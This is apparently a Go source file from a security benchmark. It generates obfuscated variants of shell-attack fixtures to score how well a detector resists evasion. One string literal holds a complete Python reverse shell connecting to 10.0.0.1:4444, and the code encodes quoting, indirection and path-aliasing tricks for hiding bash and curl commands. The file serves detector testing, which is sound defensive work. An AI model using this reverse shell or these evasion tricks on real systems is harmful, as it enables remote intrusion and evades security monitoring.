package benchmark

import (
	"bytes"
	"fmt"
	"strings"
)

// MutationType identifies the lexical evasion strategy applied.
type MutationType string

const (
	MutationQuoting              MutationType = "QUOTING"
	MutationWhitespace           MutationType = "WHITESPACE"
	MutationVariableIndirection  MutationType = "VARIABLE_INDIRECTION"
	MutationAlternateInterpreter MutationType = "ALTERNATE_INTERPRETER"
	MutationPathAliasing         MutationType = "PATH_ALIASING"
)

// MutatedVariant contains an adversarial lexical mutation of a threat fixture.
type MutatedVariant struct {
	MutationType   MutationType `json:"mutation_type"`
	Description    string       `json:"description"`
	MutatedContent []byte       `json:"mutated_content"`
	OriginalCaseID string       `json:"original_case_id"`
}

// EvasionScorecard summarizes evasion detection resilience across mutation categories.
type EvasionScorecard struct {
	TotalMutations     int                     `json:"total_mutations"`
	DetectedMutations  int                     `json:"detected_mutations"`
	ResilienceScore    float64                 `json:"resilience_score"`
	MutationBreakdown  map[MutationType]float64 `json:"mutation_breakdown"`
}

// LexicalMutator generates static lexical mutations of script payloads without execution.
type LexicalMutator struct{}

// NewLexicalMutator initializes the lexical mutator.
func NewLexicalMutator() *LexicalMutator {
	return &LexicalMutator{}
}

// GenerateMutations produces non-executing adversarial syntax mutations of a base script fixture.
func (m *LexicalMutator) GenerateMutations(content []byte, caseID string) []MutatedVariant {
	var variants []MutatedVariant
	src := string(content)

	// 1. Quoting Variations (e.g. b'a'sh, "c"ur"l")
	if strings.Contains(src, "bash") || strings.Contains(src, "sh") || strings.Contains(src, "curl") {
		quoted := strings.ReplaceAll(src, "bash", "b'a'sh")
		quoted = strings.ReplaceAll(quoted, "curl", "c\"u\"rl")
		if quoted != src {
			variants = append(variants, MutatedVariant{
				MutationType:   MutationQuoting,
				Description:    "Single and double quote lexical splitting on core binary identifiers",
				MutatedContent: []byte(quoted),
				OriginalCaseID: caseID,
			})
		}
	}

	// 2. Whitespace / Tab / Newline Injection
	if strings.Contains(src, " ") {
		spaceInjected := strings.ReplaceAll(src, " -i ", "   -i   ")
		spaceInjected = strings.ReplaceAll(spaceInjected, ">&", " >& ")
		if spaceInjected != src {
			variants = append(variants, MutatedVariant{
				MutationType:   MutationWhitespace,
				Description:    "Redundant whitespace, tab, and token delimiter injection",
				MutatedContent: []byte(spaceInjected),
				OriginalCaseID: caseID,
			})
		}
	}

	// 3. Variable Indirection (e.g. B=bash; $B -i)
	if strings.Contains(src, "bash -i") || strings.Contains(src, "/bin/bash") {
		varIndirected := fmt.Sprintf("#!/bin/bash\nSHELL_BIN=\"/bin/bash\"\n%s", strings.ReplaceAll(src, "/bin/bash", "$SHELL_BIN"))
		variants = append(variants, MutatedVariant{
			MutationType:   MutationVariableIndirection,
			Description:    "Dynamic shell variable assignment and expansion indirection",
			MutatedContent: []byte(varIndirected),
			OriginalCaseID: caseID,
		})
	}

	// 4. Path Aliasing (e.g. /bin/../bin/bash, /usr/bin/env bash)
	if strings.Contains(src, "/bin/bash") || strings.Contains(src, "/bin/sh") {
		aliased := strings.ReplaceAll(src, "/bin/bash", "/bin/../bin/bash")
		aliased = strings.ReplaceAll(aliased, "/bin/sh", "/usr/bin/env sh")
		if aliased != src {
			variants = append(variants, MutatedVariant{
				MutationType:   MutationPathAliasing,
				Description:    "Relative traversal and /usr/bin/env path aliasing",
				MutatedContent: []byte(aliased),
				OriginalCaseID: caseID,
			})
		}
	}

	// 5. Alternate Interpreter Variations
	if strings.Contains(src, "/dev/tcp") || strings.Contains(src, "socket.socket") {
		pythonAlt := `#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
`
		variants = append(variants, MutatedVariant{
			MutationType:   MutationAlternateInterpreter,
			Description:    "Cross-interpreter syntax transformation for network shell redirection",
			MutatedContent: []byte(pythonAlt),
			OriginalCaseID: caseID,
		})
	}

	// Always ensure at least one valid fallback variant exists if no patterns matched
	if len(variants) == 0 && len(content) > 0 {
		var buf bytes.Buffer
		buf.WriteString("# Adversarial Whitespace Mutation\n")
		buf.Write(content)
		buf.WriteString("\n# End Mutation\n")
		variants = append(variants, MutatedVariant{
			MutationType:   MutationWhitespace,
			Description:    "Comment prefix/suffix whitespace mutation",
			MutatedContent: buf.Bytes(),
			OriginalCaseID: caseID,
		})
	}

	return variants
}
